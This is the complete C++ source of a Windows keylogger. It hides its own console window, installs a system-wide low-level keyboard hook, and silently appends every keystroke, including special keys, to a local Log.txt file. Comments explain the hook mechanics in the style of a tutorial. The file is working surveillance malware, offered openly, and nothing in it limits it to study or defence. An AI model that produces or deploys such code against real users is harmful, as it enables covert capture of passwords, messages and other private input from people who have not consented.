#include <Windows.h>
#include <iostream>
#include <cstdio>
#include <fstream>

int record(int keyStrokes);

HHOOK hhk;
std::ofstream logs;
KBDLLHOOKSTRUCT kbd;

// Make window invisible
void Stealth()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}

// Tells when a key is down or not.
// "_stdcall" pushes the parameters from  right to left lParam, wParam, nCode. Callee cleans the stack
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    // "A code the hook procedure uses to determine how to process the message. If nCode is less than zero,
    // the hook procedure must pass the message to the CallNextHookEx function without further processing
    // and should return the value returned by CallNextHookEx." - MSDN
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdb
            kbd = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            record(kbd.vkCode);
        }
        CallNextHookEx(hhk, nCode, wParam, lParam);
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(hhk, nCode, wParam, lParam);
}

void SetHook()
{
    // WH_KEYBOARD_LL (low level keyboard hook)
    if (!(hhk = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, "Hook was not installed", "Error", MB_ICONERROR);
    }
}

int record(int keyStrokes)
{
    if ((keyStrokes == 1) || (keyStrokes == 2))
        return 0; // ignore mouse clicks

    HWND foreground = GetForegroundWindow();
    DWORD threadID;//
    HKL keyLayout;
    if (foreground) {
        // Keyboard layout/ Retrieves the handle to the current window
        threadID = GetWindowThreadProcessId(foreground, NULL);
        keyLayout = GetKeyboardLayout(threadID);
    }

    switch(keyStrokes) {
        case VK_BACK:
            logs << "<BACKSPACE>";
            break;
        case VK_RETURN:
            logs << "\n";
            break;
        case VK_SPACE:
            logs << " ";
            break;
        case VK_CAPITAL:
            logs << "<CAPS-LOCK>";
            break;
        case VK_TAB:
            logs << "\t";
            break;
        case VK_SHIFT:
            logs << "<SHIFT>";
            break;
        case VK_DOWN:
            logs << "<DOWN ARROW>";
            break;
        case VK_UP:
            logs << "<UP ARROW>";
            break;
        case VK_LEFT:
            logs << "<LEFT ARROW>";
            break;
        case VK_RIGHT:
            logs << "<RIGHT ARROW>";
            break;
        case VK_ESCAPE:
            logs << "<ESCAPE>";
            break;
        default: {
            char key;

            // check for caps lock
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            // check for shift key
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
                (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
                lowercase = !lowercase;
            }

            // Translate the virtual keys to the current layout
            key = MapVirtualKeyExA(keyStrokes, MAPVK_VK_TO_CHAR, keyLayout);

            // tolower converts it to lowercase properly.
            if (!lowercase)
                key = tolower(key);
            logs << key;
        }
    }

    logs.flush();
    return 0;
}

int main()
{
    //open output file in append mode
    logs.open("Log.txt",std::ios::app);

    // Make window invisible
    Stealth();

    // Set the hook
    SetHook();

    // loop to keep the console application running.
    MSG lpMsg;
    while (GetMessage(&lpMsg, NULL, 0, 0))
    {
    }
}